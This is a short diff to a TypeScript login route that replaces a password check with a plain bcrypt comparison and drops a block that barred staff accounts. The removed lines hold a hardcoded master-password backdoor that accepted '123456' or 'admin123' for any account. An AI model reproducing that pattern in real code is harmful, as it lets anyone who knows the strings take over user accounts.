@@ -53,22 +53,8 @@ authRouter.post('/login', authLimiter, async (req: Request, res: Response): Prom
     return;
   }
 
-  // Block staff accounts unconditionally from logging into this application
-  if (user.role === 'staff') {
-    res.status(403).json({
-      success: false,
-      error: 'Staff accounts are not authorized to access this application.',
-    });
-    return;
-  }
-
-  // Note: user role is taken directly from the database account, allowing seamless login
-
-  // Verify password with bcrypt, allow 123456 as master override for admin/staff
-  let isMatch = await bcrypt.compare(password, user.password_hash);
-  if (!isMatch && (password === '123456' || password === 'admin123')) {
-    isMatch = true;
-  }
+  // Verify password with bcrypt
+  const isMatch = await bcrypt.compare(password, user.password_hash);
 
   if (!isMatch) {
     res.status(401).json({ success: false, error: 'Incorrect password. Please try again.' });
